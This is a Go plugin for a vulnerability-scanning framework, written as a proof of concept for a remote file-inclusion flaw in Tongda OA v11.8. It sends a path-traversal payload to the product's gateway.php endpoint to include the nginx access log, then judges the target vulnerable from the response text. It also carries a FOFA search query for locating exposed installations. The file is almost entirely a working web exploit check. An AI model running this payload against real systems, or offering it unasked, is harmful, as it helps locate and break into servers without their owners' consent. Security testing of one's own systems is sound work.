package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.8_getway_远程文件包含漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.8_getway_存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "File contains", "文件包含"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 构建请求体
	requestBody := `json={"url":"/general/../../nginx/logs/oa.access.log"}`

	requestOption := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/ispirit/interface/gateway.php",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Content-Type":    "application/x-www-form-urlencoded",
			"Content-Length":  fmt.Sprintf("%d", len(requestBody)),
			"Accept-Encoding": "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody),
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应包内容是否包含指定字符串
		responseBody := string(responseOption.Body)
		if strings.Contains(responseBody, "ERROR URL") {
			fmt.Println("漏洞存在")
			return true, nil
		}
	}

	return false, nil
}
